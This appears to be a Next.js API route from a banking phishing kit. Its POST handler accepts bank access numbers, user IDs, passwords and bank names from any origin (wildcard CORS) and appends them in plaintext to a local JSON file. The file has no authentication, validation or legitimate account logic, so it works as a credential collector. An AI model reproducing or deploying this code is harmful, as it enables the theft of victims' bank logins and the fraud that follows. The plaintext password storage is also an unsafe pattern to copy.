import { NextRequest, NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';

const CORS_HEADERS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization',
};

// Disable Next.js default body parser
export const config = {
  api: {
    bodyParser: false, // We handle parsing ourselves
  },
};

export async function POST(req: NextRequest) {
  try {
    // Manually parse the incoming form data
    const body = await req.text(); // Read raw text body
    const params = new URLSearchParams(body); // Convert it to a URLSearchParams object

    // Extract values from the form data
    const accessNumber = params.get('accessNumber');
    const userId = params.get('userId');
    const password = params.get('password');
    const bank = params.get('bank');

    const data = {
      accessNumber,
      userId,
      password,
      bank,
      timestamp: new Date().toISOString(),
    };

    const filePath = path.join(process.cwd(), 'data', 'info.json');
    let currentData: any[] = [];

    if (fs.existsSync(filePath)) {
      const rawData = fs.readFileSync(filePath, 'utf8').trim();
      try {
        currentData = rawData ? JSON.parse(rawData) : [];
      } catch (e) {
        console.warn('Invalid JSON, resetting file...');
        currentData = [];
        fs.writeFileSync(filePath, '[]');
      }
    }

    // Add the new data to the current data
    currentData.push(data);

    // Write the updated data to the file
    fs.writeFileSync(filePath, JSON.stringify(currentData, null, 2));

    // Return success response
    return new NextResponse(
      JSON.stringify({ success: true, message: 'Data saved successfully' }),
      {
        status: 200,
        headers: CORS_HEADERS,
      }
    );
  } catch (error) {
    return new NextResponse(
      JSON.stringify({
        success: false,
        message: 'Failed to save data',
        error: (error as Error).message,
      }),
      {
        status: 500,
        headers: CORS_HEADERS,
      }
    );
  }
}

export async function OPTIONS() {
  return new NextResponse(null, {
    status: 200,
    headers: CORS_HEADERS,
  });
}
